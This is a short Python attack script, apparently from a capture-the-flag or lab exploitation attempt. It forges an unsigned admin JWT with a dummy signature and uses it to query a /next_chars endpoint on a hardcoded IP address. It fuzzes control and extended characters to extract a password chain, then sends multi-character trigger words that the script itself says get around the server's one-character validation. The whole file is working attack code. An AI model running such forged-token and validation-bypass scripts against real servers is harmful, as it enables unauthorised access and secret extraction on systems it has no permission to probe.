#!/usr/bin/env python3
import base64, json, time, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header_b64 = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload_b64 = b64url(json.dumps({"admin": True, "timestamp": int(time.time())}, separators=(",", ":")).encode())
forged_jwt = f"{header_b64}.{payload_b64}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"

SECRET = "77.204.214.64"

# Control chars (0-31, 127) we previously skipped, plus extended Latin-1 (128-255)
test_chars = [chr(i) for i in range(0, 32)] + [chr(127)] + [chr(i) for i in range(128, 256)]

print(f"Testing {len(test_chars)} control/extended characters against secret-server /next_chars with admin JWT...")
hits = []
for c in test_chars:
    try:
        r = requests.get(f"http://{SECRET}/next_chars", params={"char": c}, headers={"JWT": forged_jwt}, timeout=4)
        body = r.text.strip()
        if r.status_code == 200 and body not in ("[]", ""):
            hits.append((repr(c), r.status_code, body))
            print(f"  !!! char={c!r} (ord={ord(c)}) -> {r.status_code}: {body}")
    except requests.exceptions.RequestException:
        pass
    except Exception:
        pass

print(f"\nTotal hits: {len(hits)}")
if not hits:
    print("Nothing found outside the known password-chain characters.")

# Also try sending 'char' as multiple chars / common trigger words, ignoring the "exactly one char" validation
print("\n### Trying multi-char 'char' values (common trigger words) despite the validation ###")
for trial in ["session", "token", "admin", "flag", "real", "secret", "", "ss", "  "]:
    r = requests.get(f"http://{SECRET}/next_chars", params={"char": trial}, headers={"JWT": forged_jwt}, timeout=4)
    print(f"  char={trial!r} -> {r.status_code}: {r.text.strip()[:150]}")
